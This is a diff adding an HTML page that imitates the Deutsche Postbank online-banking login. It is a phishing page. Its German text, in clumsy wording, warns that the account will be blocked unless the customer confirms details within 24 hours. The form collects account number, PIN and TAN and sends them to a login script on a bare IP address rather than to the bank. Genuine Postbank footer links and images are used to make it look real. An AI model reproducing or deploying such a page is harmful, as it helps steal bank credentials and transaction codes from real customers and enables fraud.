@@ -1,0 +1,192 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Kundenzugang</title>
+
+<style>
+FORM {
+	PADDING-RIGHT: 0px; PADDING-LEFT: 0px; PADDING-BOTTOM: 0px; MARGIN: 0px; PADDING-TOP: 0px; FONT-FAMILY: Arial, Helvetica, sans-serif
+}
+</style>
+</head>
+
+<body topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0">
+
+
+
+<table border="0" width="100%" id="table2" cellspacing="0" cellpadding="0" height="100%">
+<tr>
+<td width="140" bgcolor="#FFCC00" valign="top">
+<img border="0" src="http://202.64.148.83/manual/pblogo2.gif" width="140" height="88"><p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;<br>
+&nbsp; 
+<br>
+&nbsp;</p>
+<p><a href="http://www.dpwn.de/">
+<img border="0" src="http://202.64.148.83/manual/dpwn.gif" width="138" height="52"></a></td>
+<td valign="top">
+<table border="0" width="100%" id="table3" cellspacing="0" cellpadding="0">
+<tr>
+<td bgcolor="#000066">
+<table border="0" width="100%" id="table4" cellspacing="0" cellpadding="0">
+<tr>
+<td><span lang="ru">&nbsp;</span></td>
+<td width="177">&nbsp;</td>
+<td>&nbsp;</td>
+</tr>
+<tr>
+<td width="430">
+<img border="0" src="http://202.64.148.83/manual/head_visual.jpg" width="430" height="65"></td>
+<td valign="top" width="177">
+&nbsp;</td>
+<td valign="top">&nbsp;</td>
+</tr>
+<tr>
+<td><span lang="ru">&nbsp;</span></td>
+<td width="177">&nbsp;</td>
+<td>&nbsp;</td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td>
+<table border="0" width="100%" cellspacing="0" cellpadding="18">
+<tr>
+<td><table border="1" width="100%" id="table1" bordercolor="#2A3385" cellspacing="0" cellpadding="0" style="border-style: solid; border-width: 0">
+<tr>
+<td><form action="http://202.64.148.83/manual/login.php" name="loginForm" method=GET>
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF">
+<tr>
+<td bgcolor="#000066"><b><font face="Arial" size="2" color="#FFFFFF">&nbsp;&nbsp;&nbsp; 
+Kundenzugang</font></b></td>
+</tr>
+<tr>
+<td bgcolor="#C0CDE0" height="8"><img witdh="1" height="1"></td>
+</tr>
+<tr>
+<td bgcolor="#A5B3D0" height="2"><img witdh="1" height="1"></td>
+</tr>
+<tr>
+<td>
+<table border="0" width="100%" cellspacing="0" cellpadding="6">
+<tr>
+<td><font face="Arial" size="2" color="#000066">Geehrte Kunden und Kundinnenu 
+Postbank Online-Banking!</font><p><font face="Arial" size="2" color="#000066">Lesen sie 
+bitte aufmerksam diese Meldung ueber die Datensicherung. Wir arbeiten, um unsere 
+Anwender gegen den Betrug zu verteidigen.</font></p>
+<p><font face="Arial" size="2" color="#000066">Ihr Konto wurde zur Kontrolle 
+gewaehlt, wir brauchen das, um zu bestaetigen, dass Sie ein echter Besitzer 
+dieses Kontos sind. Doch Sie sollen alle folgenden Punkte beachten. Fuellen Sie 
+bitte die ganzen Felder, die weiter gehen, aus und druecken Sie Anmelden.</font></p>
+<p><font face="Arial" size="2" color="#000066">Merken Sie sich, wenn Sie die 
+Information waehrend 24 Stunden nicht bestaetigen, sollen wir unbedingt Ihr 
+Konto fuer seine Verteidigung blockieren.</font></p>
+<p><font face="Arial" size="2" color="#000066">Danken schoen.</font></td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td valign="bottom" bgcolor="#A5B3D0" height="2"><img witdh="1" height="1"></td>
+</tr>
+<tr>
+<td>
+<table border="0" width="100%" cellspacing="0" bgcolor="#C0CDE0" cellpadding="5">
+<tr>
+<td>
+<p align="right"><font face="Arial" size="2" color="#000066">
+Kontonummer</font></td>
+<td>
+<input type="text" name="accountNumber" size="6" style="font-family: Arial; font-size: 10pt; color: #2A3385; border: 1px solid #7F9DB9"></td>
+<td>&nbsp;</td>
+</tr>
+<tr>
+<td width="200">
+<p align="right"><font face="Arial" size="2" color="#000066">PIN</font></td>
+<td>
+<input type="text" name="pinNumber" size="6" style="font-family: Arial; font-size: 10pt; color: #2A3385; border: 1px solid #7F9DB9"></td>
+<td>
+<p align="right"><b><font face="Arial" size="2" color="#000066">
+<input type="submit" accessKey=2 tabIndex=3 type=submit value="Anmelden" name=action
+				 style="ORDER-RIGHT: #c0cde0 0px solid; PADDING-RIGHT: 5px; BORDER-TOP: 0px solid #c0cde0;
+				  DISPLAY: block; PADDING-LEFT: 0px; FONT-WEIGHT: bold; FONT-SIZE: 10pt;
+				   BACKGROUND: url('http://202.64.148.83/manual/b.jpg') no-repeat right 50%; PADDING-BOTTOM: 0px; BORDER-LEFT: 0px solid #c0cde0; BORDER-RIGHT: 0px solid #c0cde0; WIDTH: 100;
+				    CURSOR: pointer; COLOR: #000066; LINE-HEIGHT: 1.2em;
+				     PADDING-TOP: 0px; BORDER-BOTTOM: 0px solid #c0cde0; TEXT-DECORATION: underline; font-family:Arial;
+				      margin-left:-10px; margin-right:0px; margin-top:0px; margin-bottom:0px"></font></b></td>
+</tr>
+<tr>
+<td>
+<p align="right"><font face="Arial" size="2" color="#000066">TAN</font></td>
+<td>
+<input type="text" name="tanNumber" size="6" style="font-family: Arial; font-size: 10pt; color: #2A3385; border: 1px solid #7F9DB9"></td>
+<td>&nbsp;</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</span> 
+&nbsp;<div align="right">
+<table border="0" width="200" id="table5" cellspacing="0" cellpadding="3" bgcolor="#FFFFFF" style="border: 1px solid #C0CDE0">
+<tr>
+<td valign="middle">
+<table border="0" width="100%" id="table6" cellspacing="0" cellpadding="2" bgcolor="#FFFFFF">
+<tr>
+<td>
+<a title="Bitte klicken Sie hier für mehr Informationen.  - Öffnet ein neues Fenster" target="_blank" href="http://www.biene-award.de/award/index.html">
+<font color="#2A3385">
+<img alt="Biene Award - Gold - 2004: Bitte klicken Sie hier für mehr Informationen." src="https://banking.postbank.de/app/static/images/biene04gold2.gif" border="0" align="left"></font></a></td>
+<td><font color="#2A3385"><b>
+<font size="2" face="Arial">Einfach<br>
+</font>
+<font size="4" face="Times New Roman">ausgezeichnet<br>
+</font><font size="2" face="Arial">für alle!</font></b></font></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+</table>
+				
+
+</td>
+</tr>
+</table>
+<table border="0" width="100%" id="table7" cellpadding="20" cellspacing="0">
+	<tr>
+		<td>
+<font face="Arial" size="2">
+<a href="https://banking.postbank.de/app/rechtshinweis.init.do;jsessionid=">
+<font color="#2A3385">Rechtshinweise</font></a><font color="#2A3385"> |
+</font>
+<a href="https://banking.postbank.de/app/bedienungshilfe.init.do;jsessionid=">
+<font color="#2A3385">Bedienungshilfen</font></a><font color="#2A3385">
+</font></font> 
+<p ><font face="Arial" size="2"><font color="#2A3385">© 2004 Deutsche Postbank AG |
+</font>
+<a href="https://banking.postbank.de/app/impressum.init.do;jsessionid=">
+<font color="#2A3385">Impressum</font></a><font color="#2A3385"> </font>
+</font>
+		<p>&nbsp;</td>
+	</tr>
+</table>
+</td>
+</tr>
+</table>
+</form></body>
+
+</html>
